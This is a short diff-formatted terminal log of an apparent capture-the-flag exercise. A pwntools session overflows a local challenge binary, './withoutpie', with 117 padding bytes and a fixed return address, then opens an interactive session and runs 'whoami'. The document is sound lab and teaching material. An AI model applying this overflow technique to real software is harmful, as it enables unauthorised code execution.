@@ -1,0 +1,16 @@
+kali㉿kali)-[~/pwns/chall_02]
+└─$ python           ------------------------------------------------------------------->  Command     
+Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from pwn import *     ------------------------------------------------------------------->  Command
+>>> p=process('./withoutpie')   ------------------------------------------------------------------->  Command
+[x] Starting local process './withoutpie'
+[+] Starting local process './withoutpie': pid 307274
+>>> payload=b'A'*(117) + p32(0x08049182)   ------------------------------------------------------------------->  Command
+>>> p.sendline(payload)    ------------------------------------------------------------------->  Command
+>>> p.interactive()    ------------------------------------------------------------------->  Command
+[*] Switching to interactive mode
+Winning isn't everything, it's the only thing
+whoami
+kali
+
